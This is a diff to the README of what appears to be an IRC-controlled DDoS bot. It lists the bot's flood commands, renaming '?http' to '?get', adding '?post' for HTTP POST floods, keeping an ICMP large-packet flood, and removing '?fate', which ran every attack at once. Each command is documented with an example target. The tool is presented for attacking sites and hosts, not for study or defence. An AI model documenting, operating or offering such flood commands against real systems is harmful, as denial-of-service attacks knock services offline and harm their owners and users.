@@ -23,10 +23,18 @@ Raw socket programming is really hard for me. That's why all of <strong>The volu
 
 # IRC Commands
 <ul>
-  <li><strong>?http [url]</li></strong>
+  <li><strong>?get [url]</li></strong>
     <ul>
-      <li>?http https://target.com</li>
+      <li>?get https://target.com</li>
       - Flood HTTP get request to target.
+    </ul>
+</ul>
+
+<ul>
+  <li><strong>?post [url]</li></strong>
+    <ul>
+      <li>?post https://target.com</li>
+      - Flood HTTP post request to target.
     </ul>
 </ul>
 
@@ -44,14 +52,6 @@ Raw socket programming is really hard for me. That's why all of <strong>The volu
     <ul>
       <li>?icmp 192.168.1.16</li>
       - Flood ICMP with large packets to target.
-    </ul>
-</ul>
-
-<ul>
-  <li><strong>?fate [url]</li></strong>
-    <ul>
-      <li>?fate https://target.com</li>
-      - Use all DDoS function to attack target.
     </ul>
 </ul>
 
